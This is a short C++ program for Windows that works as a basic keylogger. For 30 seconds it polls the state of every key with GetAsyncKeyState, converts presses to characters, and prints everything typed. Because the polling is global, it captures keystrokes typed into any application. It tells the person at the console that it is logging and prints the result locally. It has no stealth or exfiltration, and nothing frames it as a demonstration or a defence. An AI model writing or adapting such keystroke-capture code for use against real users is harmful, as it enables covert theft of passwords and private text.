#include <windows.h>
#include <string>
#include <chrono>
#include <iostream>

std::wstring LogKeysForDuration(int durationSeconds) {
    std::wstring loggedKeys;
    auto startTime = std::chrono::steady_clock::now();
    
    while (true) {
        // Check if duration has elapsed
        auto currentTime = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(currentTime - startTime).count();
        if (elapsed >= durationSeconds) break;

        for (int key = 1; key <= 254; key++) {
            SHORT keyState = GetAsyncKeyState(key);
            if (keyState & 0x0001) { // Key state changed since last call
                WCHAR charBuffer[5] = {0};
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);

                // Handle Caps Lock as a toggled state
                if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
                    keyboardState[VK_CAPITAL] = 0x01;
                }

                int charsCopied = ToUnicode(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, charBuffer, 4, 0);
                if (charsCopied == 1) {
                    // Append character to the logged string
                    loggedKeys += charBuffer[0];
                } else if (key == VK_SPACE) {
                    loggedKeys += L' '; // Append space directly
                } else if (key == VK_TAB) {
                    loggedKeys += L"    "; // Append tab as four spaces
                } else if (key == VK_RETURN) {
                    loggedKeys += L'\n'; // Append newline for Enter key
                }
                // Add more cases as needed
            }
        }

        Sleep(10); // Reduce CPU usage
    }

    return loggedKeys;
}

int main() {
    std::wcout << L"Logging keys for 30 seconds. Please start typing..." << std::endl;
    std::wstring loggedKeys = LogKeysForDuration(30);
    std::wcout << L"Logged keys:\n" << loggedKeys << std::endl;

    return 0;
}
